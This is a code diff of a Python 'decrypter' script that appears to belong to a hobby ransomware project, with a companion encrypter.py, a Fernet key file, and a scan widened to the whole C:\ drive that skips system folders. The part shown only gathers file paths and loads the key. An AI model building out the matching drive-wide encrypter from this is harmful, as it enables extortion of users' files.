@@ -1,7 +1,10 @@
 import os
 from cryptography.fernet import Fernet
 
-def descrypt_all_files(root_dir):
+root_dir = "C:\\"
+
+
+def decrypt_all_files(root_dir):
     all_files = []
     excluded_dir = ["System32", "Windows", "Program Files", "AppData"]
 
@@ -11,16 +14,12 @@ def descrypt_all_files(root_dir):
 
         for filename in filenames:
             full_path = os.path.join(dirpath, filename)
+            if full_path.endswith(("decrypter.py", "encrypter.py", ".git", "TheKey.key")):
+                continue
+            all_files.append(full_path)
+    return all_files
 
-files = []
-#this goes through the current directory and puts the files on a list
-for file in os.listdir():
-    if file == "decrypter.py" or file == "encrypter.py" or file == ".git" or file =="TheKey.key":
-        continue
-    #without this directories will also be added, and we also want files.
-    if(os.path.isfile(file)):
-        files.append(file)
-print(files)
+files = decrypt_all_files(root_dir)
 
 #We need the previous key to decrypt the files. 
 with open("TheKey.key", "rb") as key:
